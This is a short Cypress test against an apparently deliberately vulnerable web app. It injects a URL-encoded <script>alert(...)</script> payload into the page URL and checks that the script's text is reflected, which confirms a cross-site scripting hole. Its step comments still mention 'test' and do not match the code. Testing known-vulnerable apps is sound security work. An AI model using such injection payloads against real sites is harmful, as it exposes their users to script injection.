describe('Automated Test for Vulnerable Web App', () => {
  it('Visits the Vulnerable Web App, clicks the first button, and verifies the URL', () => {
    const payload = encodeURIComponent('<script>alert("XSS Vulnerability!");</script>');

    // Step 1: Visit the site
    cy.visit('https://app-web-berlin42-50e7ace7d4d7.herokuapp.com/');

    // Step 2: Click on the first button
    cy.get(':nth-child(1) > a').click();

    // Step 3: Change "Hello world!" to "test" in the URL
    cy.url().then((url) => {

      const modifiedURL = url.replace('Hello%20world!', payload);
      
      cy.visit(modifiedURL);
    });
    cy.wait(1000);
    // Step 4: Verify that "test" is shown on the page
    cy.contains('XSS Vulnerability!').should('be.visible');
  });
});
  